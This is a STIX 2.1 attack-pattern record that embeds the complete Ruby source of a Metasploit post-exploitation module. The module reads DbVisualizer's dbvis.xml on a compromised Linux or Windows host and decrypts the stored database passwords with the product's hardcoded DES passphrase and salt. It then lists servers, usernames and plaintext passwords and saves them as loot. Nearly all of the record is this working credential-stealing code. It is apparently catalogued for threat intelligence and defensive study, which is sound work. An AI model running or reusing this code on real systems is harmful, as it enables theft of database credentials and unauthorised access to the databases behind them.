{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8eb29698-a3a2-4011-b266-ca9d6e7075b5",
    "created": "2024-08-14T16:33:19.157303Z",
    "modified": "2024-08-14T16:33:19.157312Z",
    "name": "Multi Gather DbVisualizer Connections Settings",
    "description": " DbVisualizer stores the user database configuration in dbvis.xml. This module retrieves the connections settings from this file and decrypts the encrypted passwords.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/dbvis_enum.rb",
            "external_id": "dbvis_enum.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'openssl'\nrequire 'digest/md5'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Unix\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Gather DbVisualizer Connections Settings',\n        'Description' => %q{\n          DbVisualizer stores the user database configuration in dbvis.xml.\n          This module retrieves the connections settings from this file and decrypts the encrypted passwords.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'David Bloom' ], # Twitter: @philophobia78\n        'Platform' => %w[linux win],\n        'SessionTypes' => [ 'meterpreter', 'shell'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('PASSPHRASE', [false, 'The hardcoded passphrase used for encryption']),\n        OptInt.new('ITERATION_COUNT', [false, 'The iteration count used in key derivation', 10])\n      ], super.class\n    )\n  end\n\n  def run\n    oldversion = false\n\n    case session.platform\n    when 'linux'\n      user = session.shell_command('whoami').chomp\n      print_status(\"Current user is #{user}\")\n      if user =~ /root/\n        user_base = '/root/'\n      else\n        user_base = \"/home/#{user}/\"\n      end\n      dbvis_file = \"#{user_base}.dbvis/config70/dbvis.xml\"\n    when 'windows'\n      if session.type == 'meterpreter'\n        user_profile = session.sys.config.getenv('USERPROFILE')\n      else\n        user_profile = cmd_exec('echo %USERPROFILE%').strip\n      end\n      dbvis_file = user_profile + '\\\\.dbvis\\\\config70\\\\dbvis.xml'\n    end\n\n    unless file?(dbvis_file)\n      # File not found, we next try with the old config path\n      print_status(\"File not found: #{dbvis_file}\")\n      print_status('This could be an older version of dbvis, trying old path')\n      case session.platform\n      when 'linux'\n        dbvis_file = \"#{user_base}.dbvis/config/dbvis.xml\"\n      when 'windows'\n        dbvis_file = user_profile + '\\\\.dbvis\\\\config\\\\dbvis.xml'\n      end\n      unless file?(dbvis_file)\n        print_error(\"File not found: #{dbvis_file}\")\n        return\n      end\n      oldversion = true\n    end\n\n    print_status(\"Reading: #{dbvis_file}\")\n    print_line\n    raw_xml = ''\n    begin\n      raw_xml = read_file(dbvis_file)\n    rescue EOFError\n      # If there's nothing in the file, we hit EOFError\n      print_error(\"Nothing read from file: #{dbvis_file}, file may be empty\")\n      return\n    end\n\n    if oldversion\n      # Parse old config file\n      db_table = parse_old_config_file(raw_xml)\n    else\n      # Parse new config file\n      db_table = parse_new_config_file(raw_xml)\n    end\n\n    if db_table.rows.empty?\n      print_status('No database settings found')\n    else\n      print_line\n      print_line(db_table.to_s)\n      print_good('Try to query listed databases with dbviscmd.sh (or .bat) -connection <alias> -sql <statements> and have fun!')\n      print_line\n      # Store found databases in loot\n      p = store_loot('dbvis.databases', 'text/csv', session, db_table.to_csv, 'dbvis_databases.txt', 'dbvis databases')\n      print_good(\"Databases settings stored in: #{p}\")\n    end\n\n    print_status(\"Downloading #{dbvis_file}\")\n    p = store_loot('dbvis.xml', 'text/xml', session, read_file(dbvis_file), dbvis_file.to_s, 'dbvis config')\n    print_good \"dbvis.xml saved to #{p}\"\n  end\n\n  # New config file parse function\n  def parse_new_config_file(raw_xml)\n    db_table = Rex::Text::Table.new(\n      'Header' => 'DbVisualizer Databases',\n      'Indent' => 2,\n      'Columns' =>\n      [\n        'Alias',\n        'Type',\n        'Server',\n        'Port',\n        'Database',\n        'Namespace',\n        'UserID',\n        'Password'\n      ]\n    )\n\n    dbs = []\n    db = {}\n    dbfound = false\n    version_found = false\n    # fetch config file\n    raw_xml.each_line do |line|\n      if version_found == false\n        version_found = find_version(line)\n      end\n\n      if line =~ /<Database id=/\n        dbfound = true\n      elsif line =~ %r{</Database>}\n        dbfound = false\n        if db[:Database].nil?\n          db[:Database] = ''\n        end\n        if db[:Namespace].nil?\n          db[:Namespace] = ''\n        end\n        # save\n        dbs << db if (db[:Alias] && db[:Type] && db[:Server] && db[:Port])\n        db = {}\n      end\n\n      next unless dbfound == true\n\n      # get the alias\n      if line =~ %r{<Alias>([\\S+\\s+]+)</Alias>}i\n        db[:Alias] = ::Regexp.last_match(1)\n      end\n\n      # get the type\n      if line =~ %r{<Type>([\\S+\\s+]+)</Type>}i\n        db[:Type] = ::Regexp.last_match(1)\n      end\n\n      # get the user\n      if line =~ %r{<Userid>([\\S+\\s+]+)</Userid>}i\n        db[:UserID] = ::Regexp.last_match(1)\n      end\n\n      # get user password\n      if line =~ %r{<Password>([\\S+\\s+]+)</Password>}i\n        enc_password = ::Regexp.last_match(1)\n        db[:Password] = decrypt_password(enc_password)\n      end\n\n      # get the server\n      if line =~ %r{<UrlVariable UrlVariableName=\"Server\">([\\S+\\s+]+)</UrlVariable>}i\n        db[:Server] = ::Regexp.last_match(1)\n      end\n\n      # get the port\n      if line =~ %r{<UrlVariable UrlVariableName=\"Port\">([\\S+\\s+]+)</UrlVariable>}i\n        db[:Port] = ::Regexp.last_match(1)\n      end\n\n      # get the database\n      if line =~ %r{<UrlVariable UrlVariableName=\"Database\">([\\S+\\s+]+)</UrlVariable>}i\n        db[:Database] = ::Regexp.last_match(1)\n      end\n\n      # get the Namespace\n      if line =~ %r{<UrlVariable UrlVariableName=\"Namespace\">([\\S+\\s+]+)</UrlVariable>}i\n        db[:Namespace] = ::Regexp.last_match(1)\n      end\n    end\n\n    # Fill the tab and report eligible servers\n    dbs.each do |db|\n      if ::Rex::Socket.is_ipv4?(db[:Server].to_s)\n        print_good(\"Reporting #{db[:Server]}\")\n        report_host(host: db[:Server])\n      end\n\n      db_table << [ db[:Alias], db[:Type], db[:Server], db[:Port], db[:Database], db[:Namespace], db[:UserID], db[:Password] ]\n      report_cred(\n        ip: db[:Server],\n        port: db[:Port].to_i,\n        service_name: db[:Type],\n        username: db[:UserID],\n        password: db[:Password]\n      )\n    end\n    return db_table\n  end\n\n  # New config file parse function\n  def parse_old_config_file(raw_xml)\n    db_table = Rex::Text::Table.new(\n      'Header' => 'DbVisualizer Databases',\n      'Indent' => 2,\n      'Columns' =>\n      [\n        'Alias',\n        'Type',\n        'URL',\n        'UserID',\n        'Password'\n      ]\n    )\n\n    dbs = []\n    db = {}\n    dbfound = false\n    version_found = false\n\n    # fetch config file\n    raw_xml.each_line do |line|\n      if version_found == false\n        vesrion_found = find_version(line)\n      end\n\n      if line =~ /<Database id=/\n        dbfound = true\n      elsif line =~ %r{</Database>}\n        dbfound = false\n        # save\n        dbs << db if (db[:Alias] && db[:Url])\n        db = {}\n      end\n\n      next unless dbfound == true\n\n      # get the alias\n      if line =~ %r{<Alias>([\\S+\\s+]+)</Alias>}i\n        db[:Alias] = ::Regexp.last_match(1)\n      end\n\n      # get the type\n      if line =~ %r{<Type>([\\S+\\s+]+)</Type>}i\n        db[:Type] = ::Regexp.last_match(1)\n      end\n\n      # get the user\n      if line =~ %r{<Userid>([\\S+\\s+]+)</Userid>}i\n        db[:UserID] = ::Regexp.last_match(1)\n      end\n\n      # get the user password\n      if line =~ %r{<Password>([\\S+\\s+]+)</Password>}i\n        enc_password = ::Regexp.last_match(1)\n        db[:Password] = decrypt_password(enc_password)\n      end\n\n      # get the server URL\n      if line =~ %r{<Url>(\\S+)</Url>}i\n        db[:URL] = ::Regexp.last_match(1)\n      end\n    end\n\n    # Fill the tab\n    dbs.each do |db|\n      if (db[:URL] =~ %r{[\\S+\\s+]+/+([\\S+\\s+]+):[\\S+]+}i)\n        server = ::Regexp.last_match(1)\n        if ::Rex::Socket.is_ipv4?(server)\n          print_good(\"Reporting #{server}\")\n          report_host(host: server)\n        end\n      end\n      db_table << [ db[:Alias], db[:Type], db[:URL], db[:UserID], db[:Password] ]\n      report_cred(\n        ip: server,\n        port: '',\n        service_name: db[:Type],\n        username: db[:UserID],\n        password: db[:Password]\n      )\n    end\n    return db_table\n  end\n\n  def find_version(tag)\n    found = false\n    if tag =~ %r{<Version>([\\S+\\s+]+)</Version>}i\n      found = true\n      print_good(\"DbVisualizer version: #{::Regexp.last_match(1)}\")\n    end\n    found\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      post_reference_name: refname,\n      session_id: session_db_id,\n      origin_type: :session,\n      private_data: opts[:password],\n      private_type: :password,\n      username: opts[:username]\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def decrypt_password(enc_password)\n    enc_password = Rex::Text.decode_base64(enc_password)\n    dk, iv = get_derived_key\n    des = OpenSSL::Cipher.new('DES-CBC')\n    des.decrypt\n    des.key = dk\n    des.iv = iv\n    password = des.update(enc_password) + des.final\n  end\n\n  def get_derived_key\n    key = passphrase + salt\n    iteration_count.times do\n      key = Digest::MD5.digest(key)\n    end\n    return key[0, 8], key[8, 8]\n  end\n\n  def salt\n    [-114, 18, 57, -100, 7, 114, 111, 90].pack('C*')\n  end\n\n  def passphrase\n    datastore['PASSPHRASE'] || 'qinda'\n  end\n\n  def iteration_count\n    datastore['ITERATION_COUNT'] || 10\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[linux win]"
    ]
}